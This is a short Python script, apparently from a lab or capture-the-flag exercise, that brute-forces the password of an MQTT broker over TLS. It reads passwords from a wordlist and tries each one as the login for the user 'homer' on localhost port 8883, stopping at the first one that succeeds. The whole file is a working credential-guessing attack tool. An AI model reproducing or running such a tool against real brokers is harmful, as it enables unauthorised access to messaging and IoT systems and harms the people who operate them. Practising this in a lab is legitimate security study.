import ssl
import time
import paho.mqtt.client as mqtt

BROKER_HOST = "localhost"
BROKER_PORT = 8883
CA_CERT = "certs/ca.crt"

def on_connect(client, userdata, flags, rc):
    """
    Callback for when the client receives a CONNACK response from the server.
    """
    print(f"[DEBUG] on_connect rc = {rc}")
    userdata["connect_rc"] = rc   
    userdata["connected"] = True

def on_publish(client, userdata, mid):
    """
    Callback for when a message that was to be sent using the publish() 
    call has completed transmission to the broker.
    """
    print(f"[DEBUG] Message published (mid={mid})")

def login(username, password):
    """
    Attempt to login to the MQTT broker with the given username and password.
    """
    userdata = {"connected": False, "connect_rc": None}
    client = mqtt.Client(userdata=userdata)
    client.username_pw_set(username, password)
    client.tls_set(
        ca_certs=CA_CERT,
        certfile=None,
        keyfile=None,
        tls_version=ssl.PROTOCOL_TLS_CLIENT
    )

    client.on_connect = on_connect
    client.on_publish = on_publish

    print("[DEBUG] Connecting to broker...")
    rc = client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    if rc != 0:
        print(f"[DEBUG] TCP/TLS connect failed with rc={rc}")
        return False

    client.loop_start()

    # wait a bit for on_connect to run
    timeout = time.time() + 5
    while not userdata["connected"] and time.time() < timeout:
        time.sleep(0.1)

    client.loop_stop()
    client.disconnect()
    print("[DEBUG] Disconnected.")

    broker_rc = userdata["connect_rc"]
    if broker_rc == 0:
        return True
    else:
        print(f"[DEBUG] Broker refused connection, rc={broker_rc}")
        return False


if __name__ == "__main__":
    ## Read wordlist lin by line and call login with each line as password
    with open("wordlist.txt", "r", encoding="utf-8") as file:
        for line in file:
            password = line.strip()
            print(f"[INFO] Trying: {password}")

            success = login("homer", password)
            if success:
                print(f"[INFO] Successful login with password: {password}")
                break
            else:
                print(f"[INFO] Failed login with password: {password}")
            